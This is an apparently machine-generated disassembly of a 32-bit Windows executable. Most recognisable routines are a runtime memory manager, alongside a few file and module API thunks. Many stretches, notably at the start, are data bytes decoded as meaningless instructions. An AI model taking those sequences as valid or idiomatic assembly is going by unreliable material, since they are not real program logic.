sub_4010e4
adc [ eax ] al
add eax 0x736c6146
add al 0x54
jb r-xdata
inc eax
add ah ch
xor eax 0x35e00040
inc eax
mov eax eax
clc
adc [ eax ] al
or al [ esi ]
push ebx
je r-xdata
add al 0xf8
je r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edi ] al
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
adc al 0x11
inc eax
add [ edi + eax ] cl
inc esp
and al 0x4
clc
jmp r-xdata
insd
add [ eax ] al
test al 0x11
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
popad
outsb
je r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403444
test al al
je r-xdata
jmp sub_405c24
jb r-xdata
push esi
popad
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 2 + 0x11 ] si
inc eax
add [ eax ] al
adc [ eax ] eax
pop es
nop
mov al 0x10
inc eax
add [ esi + eax ] al
inc esp
outsd
jne r-xdata
inc eax
add [ ecx + edx ] ah
inc eax
add [ edx + ecx ] cl
dec edi
insb
push esi
popad
jb r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
jb r-xdata
insb
add [ gs : ebp + 0x10c00040 ] ecx
inc eax
add [ eax + ecx ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
outsb
je r-xdata
pop ebx
pop ebp
retn 0xc
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
add [ eax ] al
add [ eax ] al
inc esi
and eax 0x8004012
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12a00040 ] cl
inc eax
add [ ecx ] dh
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xc004012 ]
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
fdiv [ 0x5bd00040 ]
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x11004033 ] al
push esp
dec ecx
outsb
je r-xdata
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx * 4 + 0x11 ] si
inc eax
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx + 0x40 ] bh
jb r-xdata
je r-xdata
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
insd
add eax [ eax ]
imul esp [ ecx + 0x6e ] 0x40117c74
add [ eax ] al
add [ eax ] al
outsb
arpl [ ecx + 0x4 ] di
nop
rcl [ eax ] 0x1
inc eax
add [ ebx ] al
or [ edi + 0x6f ] dl
jb r-xdata
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x7004033 ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ 0x35e40040 ]
inc eax
inc eax
fadd [ ecx - 0x3f74ffb8 ]
jmp [ __import_lookup_table_1(user32:CharNextA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
mov eax 0x11004012
or edx [ edx + eax * 2 + 0x6f ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edx
outsd
outsd
insb
add al [ eax ]
add [ eax ] al
cmp bh 0xff
and eax __import_lookup_table_0(kernel32:FindClose)
mov eax eax
inc ecx
jb r-xdata
and eax FindFirstFileA@IAT
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_40134c
add [ eax ] al
add [ eax ] al
je r-xdata
dec eax
add [ ebx - 0x37da0040 ] cl
or [ eax ] 0x25ffc08b
les eax [ ecx - 0x3f74ffb8 ]
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
insd
loopne r-xdata
dec eax
add [ ebx - 0x17da0040 ] cl
or [ eax ] 0x25ffc08b
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_40134c
in al 0x81
dec eax
add [ ebx - 0x1fda0040 ] cl
or [ eax ] 0x25ffc08b
push esp
imul ebp [ ebp + 0x65 ] 0xec25ff01
or [ eax ] 0x25ffc08b
call 0xffffffff8b405b7c
sar bh 0x25
sub_401468
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401428
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4014c0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401468
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401508
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4014f0
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4014f0
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4014c0
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401578
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4014c0
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4014f0
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40160c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014c0
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401438
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401670
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401438
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401438
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014c0
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4016e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4014f0
mov [ rw-data ] 0x1
sub_4017a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401438
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401834
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4018b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40160c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4017a0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401508
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4016e8
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4014f0
jmp r-xdata
sub_401944
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401670
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401508
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401670
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016e8
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401508
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4017a0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016e8
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4014f0
jmp r-xdata
sub_401a68
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401834
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401508
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4016e8
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401578
jmp r-xdata
sub_401af4
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401baa
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401448
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
push 0xff8
push 0x0
call sub_401428
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401bb1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401458
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401bb8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c8e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401450
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
mov eax rw-data
call sub_4014b8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401460
retn
push rw-data
call sub_401458
sub_401c98
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401cfc
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401d2c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401f00
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d80
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401d5c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401da8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c98
add ebx esi
mov [ rw-data ] 0x6
sub_401e18
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c98
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401e50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401cfc
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a68
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a68
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401d2c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401578
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d80
sub_401f00
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401e50
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f88
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401d5c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401fd4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f88
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401508
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401da8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401e18
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401d2c
sub [ edi + 0x4 ] 0x4
sub_402060
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4018b4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fd4
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_40208c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401944
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fd4
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_4020c0
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_4020ec
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c98
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401f00
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_402060
test al al
jne r-xdata
mov eax esi
call sub_4020c0
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4021e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401af4
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40235c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401450
